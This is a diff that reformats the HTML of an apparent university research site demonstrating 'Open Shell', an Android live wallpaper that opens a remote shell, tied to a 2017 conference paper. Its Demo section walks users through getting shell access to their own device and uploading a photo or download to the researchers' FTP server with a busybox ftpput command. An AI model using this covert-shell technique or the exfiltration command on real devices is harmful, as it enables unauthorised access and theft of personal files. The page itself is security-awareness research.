@@ -17,7 +17,7 @@
 -->
 
 <html lang="en">
-  <head>
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="description" content="Website to demonstrate an exploit of trust on Android using a Live Wallpaper we made called Open Shell.">
@@ -30,56 +30,56 @@
     <link rel="stylesheet" href="https://code.getmdl.io/1.2.0/material.min.css">
     <link rel="stylesheet" href="styles.css">
 
-  </head>
-  <body>
-    <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+</head>
+<body>
+<div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
 
-      <div class="android-header mdl-layout__header mdl-layout__header--waterfall">
+    <div class="android-header mdl-layout__header mdl-layout__header--waterfall">
         <div class="mdl-layout__header-row">
 
-          <!-- Add spacer, to align navigation to the right in desktop -->
-          <div class="android-header-spacer mdl-layout-spacer"></div>
-          <!-- Navigation -->
-          <div class="android-navigation-container">
-            <nav class="android-navigation mdl-navigation">
-              <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#About">About</a>
-              <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Demo">Demo</a>
-              <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Downloads">Downloads</a>
-			  <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Citation">Citation</a>
-              <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Contact">Contact</a>
-            </nav>
-          </div>
+            <!-- Add spacer, to align navigation to the right in desktop -->
+            <div class="android-header-spacer mdl-layout-spacer"></div>
+            <!-- Navigation -->
+            <div class="android-navigation-container">
+                <nav class="android-navigation mdl-navigation">
+                    <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#About">About</a>
+                    <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Demo">Demo</a>
+                    <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Downloads">Downloads</a>
+                    <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Citation">Citation</a>
+                    <a class="mdl-navigation__link mdl-typography--text-uppercase" href="#Contact">Contact</a>
+                </nav>
+            </div>
         </div>
-      </div>
+    </div>
 
-      <div class="android-drawer mdl-layout__drawer">
+    <div class="android-drawer mdl-layout__drawer">
         <span class="mdl-layout-title">
           <img class="menu-logo-image" src="images/UOIT_RGB.png">
         </span>
         <nav class="mdl-navigation">
-          <span class="mdl-navigation__link" href="">About</span>
-          <div class="android-drawer-separator"></div>
-          <span class="mdl-navigation__link" href="">Demo</span>
-          <a class="mdl-navigation__link" target="_blank" href="https://openshell.nextproject.ca:8000">Terminal Site</a>
-          <a class="mdl-navigation__link" target="_blank" href="https://openshell.nextproject.ca:8000?ssh=ssh://demo:demopassword@openshell.nextproject.ca:2222">Terminal Auto-Login</a>
-          <div class="android-drawer-separator"></div>
-          <span class="mdl-navigation__link" href="">Downloads</span>
-          <a class="mdl-navigation__link" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp/releases/download/v1.0.0/openshell-1.0.0.apk">.APK File</a>
-          <a class="mdl-navigation__link" target="_blank" href="https://drive.google.com/file/d/0B2gMNSYcY61kQ0RoSGVXUzB1ckU/view?usp=sharing">Technical Paper</a>
-			<a class="mdl-navigation__link" target="_blank" href="https://github.com/uoitdnalab/OpenShellSite">Site Source Code</a>
-			<a class="mdl-navigation__link" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp">App Source Code</a>
-		  <div class="android-drawer-separator"></div>
-          <span class="mdl-navigation__link" href="">Contact</span>
-          <a id="qusaymailmenu">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</a>
-          <a id="dylanmailmenu">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</a>
+            <span class="mdl-navigation__link" href="">About</span>
+            <div class="android-drawer-separator"></div>
+            <span class="mdl-navigation__link" href="">Demo</span>
+            <a class="mdl-navigation__link" target="_blank" href="https://openshell.nextproject.ca:8000">Terminal Site</a>
+            <a class="mdl-navigation__link" target="_blank" href="https://openshell.nextproject.ca:8000?ssh=ssh://demo:demopassword@openshell.nextproject.ca:2222">Terminal Auto-Login</a>
+            <div class="android-drawer-separator"></div>
+            <span class="mdl-navigation__link" href="">Downloads</span>
+            <a class="mdl-navigation__link" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp/releases/download/v1.0.0/openshell-1.0.0.apk">.APK File</a>
+            <a class="mdl-navigation__link" target="_blank" href="https://drive.google.com/file/d/0B2gMNSYcY61kQ0RoSGVXUzB1ckU/view?usp=sharing">Technical Paper</a>
+            <a class="mdl-navigation__link" target="_blank" href="https://github.com/uoitdnalab/OpenShellSite">Site Source Code</a>
+            <a class="mdl-navigation__link" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp">App Source Code</a>
+            <div class="android-drawer-separator"></div>
+            <span class="mdl-navigation__link" href="">Contact</span>
+            <a id="qusaymailmenu">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</a>
+            <a id="dylanmailmenu">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</a>
         </nav>
-      </div>
+    </div>
 
-      <div class="android-content mdl-layout__content">
-          <a name="About"></a>
+    <div class="android-content mdl-layout__content">
+        <a name="About"></a>
         <div class="about-section mdl-typography--text-center">
-          <div class="logo-font android-slogan">Open Shell</div>
-          <div class="logo-font android-sub-slogan">An exploit of user trust with an Android live wallpaper.</div>
+            <div class="logo-font android-slogan">Open Shell</div>
+            <div class="logo-font android-sub-slogan">An exploit of user trust with an Android live wallpaper.</div>
             <br>
             <p class="mdl-typography--font-light">
                 The basic premise is that users need to be wary of permissions when they install an application on Android.
@@ -95,160 +95,160 @@
             </p>
         </div>
 
-          <a name="Demo"></a>
+        <a name="Demo"></a>
         <div class="demo-section">
-          <div class="demo-section-text">
-            <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Demo</div>
-            <p class="mdl-typography--font-light">
-				The first step is to install the app, which can be found under the <a class="android-link mdl-typography--font-light" href="#Downloads">downloads section.</a>
-				<br>
-				Next, go to our demo <a target="_blank" href="https://openshell.nextproject.ca:8000/" class="android-link mdl-typography--font-light">terminal website here.</a>
-                <br>
-				You should see a dark grey page with a Terminal: SSH box in the middle. If the Terminal: SSH option doesn't appear,
-                refresh the page. This can be a first-view issue.
-				<br>
-                Click on the Terminal: SSH box to start a new terminal. It will request the following information:
-                <br>
-                Host/IP: <code>openshell.nextproject.ca</code> Port: <code>2222</code> User: <code>demo</code> Password: <code>demopassword</code>
-                <br>
-				After entering all the info and logging in, go to your device settings, display and wallpapers, and set "Open Shell - Cube" as your wallpaper.
-                <br>
-                Setting the wallpaper establishes a connection with the server, and you viewing the wallpaper will show which port it has connected on.
-                <br>
-				To gain access to your session, type in the terminal <code>screen -r</code> followed by the port number shown on your screen, eg. <code>screen -r 10000</code>
-				<br>
-				You should now be connected to your device and see this indicated on the screen, meaning you're able to issue commands now!
-				<br>
-                Try entering <code>ls</code> to see if it's working. If a few files are listed, you're ready to go!
-                <br>
-                You now have shell access to your Android device. This isn't root access, but you still have a scary amount of power!
-                <br>
-                Feel free to poke around you device now if you're familiar with shell commands, but I'll give an example below.
-                <br>
-                If any of the commands seem to hang, try pressing <code>Ctrl + C</code> to abort it, or reconnecting to the site and resetting the wallpaper if disconnected.
-                <br>
-                For a good example of how this could be used maliciously, I've included the example of uploading one of your files to our example FTP server.
-                <br>
-                To try this out, browse to some of your files, like in <code>Download</code> or <code>DCIM/Camera</code>, so try <code>cd /sdcard/Download</code> and then <code>ls</code> to find a file.
-                <br>
-                Once you have found a suitable file to transfer, we can move it to the app directory with <code>cp FILENAME /data/data/com.example.android.livecubes/files</code>
-                <br>
-                Now that it is in the app files, we can move back to that folder with <code>cd /data/data/com.nextproject.openshell/files</code>
-                <br>
-                Lastly, we use <code>./busybox ftpput -u ftpdemo -p ftppassword -P 2121 138.197.136.154 /files/FILENAME FILENAME</code>
-                <br>
-                For those interested, more information on busybox can be <a target="_blank" href="https://busybox.net/" class="android-link mdl-typography--font-light">found here.</a>
-                <br>
-                The version used in this app may be a little outdated depending on your time of viewing, but it still adds a lot of commands to our shell!
-                <br>
-                The file should now be located on the FTP server I set up for this demo, which you can check for youself with the same credentials.
-                <br>
-                Host/IP: <code>openshell.nextproject.ca</code> Port: <code>2121</code> User: <code>ftpdemo</code> Password: <code>ftppassword</code>
-                <br>
-                Use an FTP client like WinSCP, Filezilla, etc. to see the file with the above credentials, and delete it afterwards for your own privacy.
-                <br>
-                All uploaded files will be periodically removed at an indeterminate interval, but it's always good to be safe!
-                <br>
-                Beyond peeking at your files, the shell access can execute other commands, such as those exposed in the interfaces of other applications.</a>
-                <br>
-                To close the tunnel intentionally, type exit in the terminal, hit the X in the top-right, change your wallpaper and reboot your device, or uninstall the app.
-            </p>
-          </div>
+            <div class="demo-section-text">
+                <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Demo</div>
+                <p class="mdl-typography--font-light">
+                    The first step is to install the app, which can be found under the <a class="android-link mdl-typography--font-light" href="#Downloads">downloads section.</a>
+                    <br>
+                    Next, go to our demo <a target="_blank" href="https://openshell.nextproject.ca:8000/" class="android-link mdl-typography--font-light">terminal website here.</a>
+                    <br>
+                    You should see a dark grey page with a Terminal: SSH box in the middle. If the Terminal: SSH option doesn't appear,
+                    refresh the page. This can be a first-view issue.
+                    <br>
+                    Click on the Terminal: SSH box to start a new terminal. It will request the following information:
+                    <br>
+                    Host/IP: <code>openshell.nextproject.ca</code> Port: <code>2222</code> User: <code>demo</code> Password: <code>demopassword</code>
+                    <br>
+                    After entering all the info and logging in, go to your device settings, display and wallpapers, and set "Open Shell - Cube" as your wallpaper.
+                    <br>
+                    Setting the wallpaper establishes a connection with the server, and you viewing the wallpaper will show which port it has connected on.
+                    <br>
+                    To gain access to your session, type in the terminal <code>screen -r</code> followed by the port number shown on your screen, eg. <code>screen -r 10000</code>
+                    <br>
+                    You should now be connected to your device and see this indicated on the screen, meaning you're able to issue commands now!
+                    <br>
+                    Try entering <code>ls</code> to see if it's working. If a few files are listed, you're ready to go!
+                    <br>
+                    You now have shell access to your Android device. This isn't root access, but you still have a scary amount of power!
+                    <br>
+                    Feel free to poke around you device now if you're familiar with shell commands, but I'll give an example below.
+                    <br>
+                    If any of the commands seem to hang, try pressing <code>Ctrl + C</code> to abort it, or reconnecting to the site and resetting the wallpaper if disconnected.
+                    <br>
+                    For a good example of how this could be used maliciously, I've included the example of uploading one of your files to our example FTP server.
+                    <br>
+                    To try this out, browse to some of your files, like in <code>Download</code> or <code>DCIM/Camera</code>, so try <code>cd /sdcard/Download</code> and then <code>ls</code> to find a file.
+                    <br>
+                    Once you have found a suitable file to transfer, we can move it to the app directory with <code>cp FILENAME /data/data/com.example.android.livecubes/files</code>
+                    <br>
+                    Now that it is in the app files, we can move back to that folder with <code>cd /data/data/com.nextproject.openshell/files</code>
+                    <br>
+                    Lastly, we use <code>./busybox ftpput -u ftpdemo -p ftppassword -P 2121 138.197.136.154 /files/FILENAME FILENAME</code>
+                    <br>
+                    For those interested, more information on busybox can be <a target="_blank" href="https://busybox.net/" class="android-link mdl-typography--font-light">found here.</a>
+                    <br>
+                    The version used in this app may be a little outdated depending on your time of viewing, but it still adds a lot of commands to our shell!
+                    <br>
+                    The file should now be located on the FTP server I set up for this demo, which you can check for youself with the same credentials.
+                    <br>
+                    Host/IP: <code>openshell.nextproject.ca</code> Port: <code>2121</code> User: <code>ftpdemo</code> Password: <code>ftppassword</code>
+                    <br>
+                    Use an FTP client like WinSCP, Filezilla, etc. to see the file with the above credentials, and delete it afterwards for your own privacy.
+                    <br>
+                    All uploaded files will be periodically removed at an indeterminate interval, but it's always good to be safe!
+                    <br>
+                    Beyond peeking at your files, the shell access can execute other commands, such as those exposed in the interfaces of other applications.</a>
+                    <br>
+                    To close the tunnel intentionally, type exit in the terminal, hit the X in the top-right, change your wallpaper and reboot your device, or uninstall the app.
+                </p>
+            </div>
         </div>
 
-          <a name="Downloads"></a>
-          <div class="downloads-section">
-              <div class="downloads-section-text">
-                  <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Downloads</div>
-                  <p class="mdl-typography--font-light">
-                      The APK file you have to install to your Android device to try out the demo can be
-                      <a class="android-link mdl-typography--font-light" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp/releases/download/v1.0.0/openshell-1.0.0.apk">downloaded here.</a>
-						<br>
-						The formal research paper containing the theory and background behind this exploit can be
-						<a class="android-link mdl-typography--font-light" target="_blank" href="https://drive.google.com/file/d/0B2gMNSYcY61kQ0RoSGVXUzB1ckU/view?usp=sharing">downloaded here.</a>
-						<br>
-						The GitHub page where the code for this site and the Docker containers used for the demo can be
-						<a class="android-link mdl-typography--font-light" target="_blank" href="https://github.com/uoitdnalab/OpenShellSite">found here.</a>
-						<br>
-						The GitHub page where the code for the Android app using Android Studio can be
-						<a class="android-link mdl-typography--font-light" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp">found here.</a>
-				  </p>
-              </div>
-          </div>
-		  
-		  <a name="Citation"></a>
-          <div class="citation-section">
-              <div class="citation-section-text">
-                  <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Citation</div>
-                  <p class="mdl-typography--font-light">
-                      Please use the following reference in citing this research and application:
-                      <br>
-					  <br>
-					  Mahmoud, Q.H., Kauling, D., and Zanin, S. “<a class="android-link mdl-typography--font-light" target="_blank" href="https://drive.google.com/file/d/0B2gMNSYcY61kQ0RoSGVXUzB1ckU/view?usp=sharing">Hidden Android Permissions: Remote Code Execution and Shell Access using a Live Wallpaper</a>"
-					  <br>
-					  In Proceedings of the 14th IEEE Annual Consumer Communications & Networking Conference (CCNC 2017), Las Vegas, NV, USA, Jan 2017, pp. 598-599.
-				  </p>
-              </div>
-          </div>
-		  
-          <a name="Contact"></a>
-          <div class="contact-section">
-              <div class="contact-section-text">
-                  <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Contact</div>
-                  <p class="mdl-typography--font-light">
-                      This website and live demonstration was created by Dylan Kauling, but the concept is not mine!
-                      <br>
-                      The exploit/app was created by a student under the guidance of Dr. Qusay Mahmoud at UOIT.
-                      <br>
-                      If you have any questions about the concept and applications, contact Dr. Mahmoud -
-                      <href id="qusaymail">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</href>
-                      <br>
-                      If you have any technical questions about the demo or are having troubles getting it working,
-                      feel free to shoot me an email! - <href id="dylanmail">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</href>
-				  </p>
-              </div>
-          </div>
+        <a name="Downloads"></a>
+        <div class="downloads-section">
+            <div class="downloads-section-text">
+                <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Downloads</div>
+                <p class="mdl-typography--font-light">
+                    The APK file you have to install to your Android device to try out the demo can be
+                    <a class="android-link mdl-typography--font-light" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp/releases/download/v1.0.0/openshell-1.0.0.apk">downloaded here.</a>
+                    <br>
+                    The formal research paper containing the theory and background behind this exploit can be
+                    <a class="android-link mdl-typography--font-light" target="_blank" href="https://drive.google.com/file/d/0B2gMNSYcY61kQ0RoSGVXUzB1ckU/view?usp=sharing">downloaded here.</a>
+                    <br>
+                    The GitHub page where the code for this site and the Docker containers used for the demo can be
+                    <a class="android-link mdl-typography--font-light" target="_blank" href="https://github.com/uoitdnalab/OpenShellSite">found here.</a>
+                    <br>
+                    The GitHub page where the code for the Android app using Android Studio can be
+                    <a class="android-link mdl-typography--font-light" target="_blank" href="https://github.com/uoitdnalab/OpenShellApp">found here.</a>
+                </p>
+            </div>
+        </div>
 
-      </div>
+        <a name="Citation"></a>
+        <div class="citation-section">
+            <div class="citation-section-text">
+                <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Citation</div>
+                <p class="mdl-typography--font-light">
+                    Please use the following reference in citing this research and application:
+                    <br>
+                    <br>
+                    Mahmoud, Q.H., Kauling, D., and Zanin, S. “<a class="android-link mdl-typography--font-light" target="_blank" href="https://drive.google.com/file/d/0B2gMNSYcY61kQ0RoSGVXUzB1ckU/view?usp=sharing">Hidden Android Permissions: Remote Code Execution and Shell Access using a Live Wallpaper</a>"
+                    <br>
+                    In Proceedings of the 14th IEEE Annual Consumer Communications & Networking Conference (CCNC 2017), Las Vegas, NV, USA, Jan 2017, pp. 598-599.
+                </p>
+            </div>
+        </div>
+
+        <a name="Contact"></a>
+        <div class="contact-section">
+            <div class="contact-section-text">
+                <div class="mdl-typography--font-light mdl-typography--display-1-color-contrast">Contact</div>
+                <p class="mdl-typography--font-light">
+                    This website and live demonstration was created by Dylan Kauling, but the concept is not mine!
+                    <br>
+                    The exploit/app was created by a student under the guidance of Dr. Qusay Mahmoud at UOIT.
+                    <br>
+                    If you have any questions about the concept and applications, contact Dr. Mahmoud -
+                    <href id="qusaymail">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</href>
+                    <br>
+                    If you have any technical questions about the demo or are having troubles getting it working,
+                    feel free to shoot me an email! - <href id="dylanmail">m<b>@</b>e@d<b>no</b>oma<b>.com</b>in.com</href>
+                </p>
+            </div>
+        </div>
+
     </div>
+</div>
 
-    <script src="https://code.getmdl.io/1.2.0/material.min.js"></script>
+<script src="https://code.getmdl.io/1.2.0/material.min.js"></script>
 
-    <script type="text/javascript">
-        <!--
-        var s="=b!isfg>#nbjmup;ezmbo/lbvmjohAvpju/ofu#?ezmbo/lbvmjohAvpju/ofu=0b?";
-        m="";
-        for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
-        document.getElementById('dylanmail').innerHTML=(m);
-        //-->
-    </script>
+<script type="text/javascript">
+    <!--
+    var s="=b!isfg>#nbjmup;ezmbo/lbvmjohAvpju/ofu#?ezmbo/lbvmjohAvpju/ofu=0b?";
+    m="";
+    for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
+    document.getElementById('dylanmail').innerHTML=(m);
+    //-->
+</script>
 
-    <script type="text/javascript">
-      <!--
-      var s="=b!dmbtt>#nem.obwjhbujpo``mjol#!isfg>#nbjmup;ezmbo/lbvmjohAvpju/ofu#?Ufdiojdbm;!Ezmbo!Lbvmjoh=0b?";
-      m="";
-      for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
-      document.getElementById('dylanmailmenu').innerHTML=(m);
-      //-->
-    </script>
+<script type="text/javascript">
+    <!--
+    var s="=b!dmbtt>#nem.obwjhbujpo``mjol#!isfg>#nbjmup;ezmbo/lbvmjohAvpju/ofu#?Ufdiojdbm;!Ezmbo!Lbvmjoh=0b?";
+    m="";
+    for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
+    document.getElementById('dylanmailmenu').innerHTML=(m);
+    //-->
+</script>
 
-    <script type="text/javascript">
-        <!--
-        var s="=b!isfg>#nbjmup;rvtbz/nbinpveAvpju/db#?rvtbz/nbinpveAvpju/db=0b?";
-        m="";
-        for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
-        document.getElementById('qusaymail').innerHTML=(m);
-        //-->
-    </script>
+<script type="text/javascript">
+    <!--
+    var s="=b!isfg>#nbjmup;rvtbz/nbinpveAvpju/db#?rvtbz/nbinpveAvpju/db=0b?";
+    m="";
+    for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
+    document.getElementById('qusaymail').innerHTML=(m);
+    //-->
+</script>
 
-    <script type="text/javascript">
-      <!--
-      var s="=b!dmbtt>#nem.obwjhbujpo``mjol#!isfg>#nbjmup;rvtbz/nbinpveAvpju/db#?Bdbefnjd;!Rvtbz!Nbinpve=0b?";
-      m="";
-      for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
-      document.getElementById('qusaymailmenu').innerHTML=(m);
-      //-->
-    </script>
+<script type="text/javascript">
+    <!--
+    var s="=b!dmbtt>#nem.obwjhbujpo``mjol#!isfg>#nbjmup;rvtbz/nbinpveAvpju/db#?Bdbefnjd;!Rvtbz!Nbinpve=0b?";
+    m="";
+    for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1);
+    document.getElementById('qusaymailmenu').innerHTML=(m);
+    //-->
+</script>
 
-  </body>
+</body>
 </html>
